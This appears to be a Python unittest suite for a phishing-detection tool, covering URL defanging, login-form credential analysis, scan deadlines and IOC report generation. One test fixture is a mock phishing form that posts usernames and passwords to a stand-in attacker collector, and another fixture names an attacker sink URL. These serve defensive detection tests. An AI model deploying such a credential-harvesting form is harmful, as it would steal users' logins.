"""
Phase 2 Unit & Integration Test Suite.
Tests Defanging, Credential Analysis, Deep Analysis (with 4.0s deadline), and IOC generation.
"""

import unittest
import time
from src.defang import defang_url, defang_ip
from src.credential_analysis import analyze_credentials
from src.deep_analysis import perform_deep_analysis
from src.ioc import generate_ioc


class TestDefang(unittest.TestCase):

    def test_defang_url(self):
        url1 = "https://evil.com/login"
        self.assertEqual(defang_url(url1), "hxxps[://]evil[.]com/login")

        url2 = "http://phishing.site:8080/path?arg=1.2"
        self.assertEqual(defang_url(url2), "hxxp[://]phishing[.]site:8080/path?arg=1.2")

    def test_defang_ip(self):
        ip = "192.168.1.1"
        self.assertEqual(defang_ip(ip), "192[.]168[.]1[.]1")


class TestCredentialAnalysis(unittest.TestCase):

    def test_webhook_exfiltration_sink(self):
        mock_html = """
        <html>
            <body>
                <form action="https://attacker-webhook.site/collect" method="POST">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="pwd" placeholder="Password">
                    <button type="submit">Log In</button>
                </form>
            </body>
        </html>
        """
        result = analyze_credentials(mock_html, "https://secure-login-example.com")
        self.assertTrue(result["has_login_form"])
        self.assertIn("password", result["sensitive_fields"])
        self.assertEqual(result["sink_risk"], "critical")
        self.assertTrue(result["exfiltration_flag"])

    def test_oauth_false_positive_reduction(self):
        mock_html = """
        <html>
            <body>
                <form action="https://accounts.google.com/signin" method="POST">
                    <input type="email" name="identifier" placeholder="Email">
                    <input type="password" name="Passwd" placeholder="Password">
                    <button type="submit">Sign In</button>
                </form>
            </body>
        </html>
        """
        result = analyze_credentials(mock_html, "https://my-app.com")
        self.assertTrue(result["has_login_form"])
        self.assertIn("password", result["sensitive_fields"])
        self.assertEqual(result["sink_risk"], "low")
        self.assertFalse(result["exfiltration_flag"])

    def test_no_sensitive_fields(self):
        mock_html = "<html><body><h1>Welcome to My Blog</h1></body></html>"
        result = analyze_credentials(mock_html, "https://myblog.com")
        self.assertFalse(result["has_login_form"])
        self.assertEqual(result["sink_risk"], "low")
        self.assertFalse(result["exfiltration_flag"])


class TestDeepAnalysis(unittest.TestCase):

    def test_deadline_cutoff_simulation(self):
        start = time.monotonic()
        report = perform_deep_analysis("https://google.com", timeout_budget=0.0001)
        duration = time.monotonic() - start

        self.assertTrue(report["deadline_exceeded"])
        self.assertLessEqual(duration, 2.0)


class TestIOCGenerator(unittest.TestCase):

    def test_generate_ioc_schema(self):
        mock_forensic = {
            'target_url': 'hxxps[://]evil[.]com',
            'final_url': 'hxxps[://]evil[.]com',
            'redirect_count': 0,
            'redirect_timeline': [{'hop': 0, 'url': 'hxxps[://]evil[.]com', 'status': 200, 'cross_domain': False}],
            'title': 'Phishing Page',
            'meta_description': 'Login here',
            'credential_analysis': {
                'has_login_form': True,
                'sensitive_fields': ['password'],
                'form_actions': [{'action_url': 'https://attacker.com/sink', 'destination_type': 'UNKNOWN_EXTERNAL'}],
                'sink_risk': 'critical',
                'exfiltration_flag': True
            },
            'homoglyph_analysis': {'is_punycode': False, 'mixed_script': False, 'suspected_brand': 'paypal', 'impersonation_risk': 'high'},
            'scan_duration_seconds': 0.5,
            'deadline_exceeded': False
        }

        ioc = generate_ioc("https://evil.com", mock_forensic)

        self.assertEqual(ioc["schema_version"], "1.0")
        self.assertIn("scan_id", ioc)
        self.assertIn("timestamp", ioc)
        self.assertEqual(ioc["target"]["original_url"], "https://evil.com")
        self.assertEqual(ioc["target"]["defanged_url"], "hxxps[://]evil[.]com")
        self.assertIn("evil[.]com", ioc["indicators"]["domains"])
        self.assertEqual(ioc["forensics"]["credential_audit"]["sink_risk"], "critical")


if __name__ == "__main__":
    unittest.main()
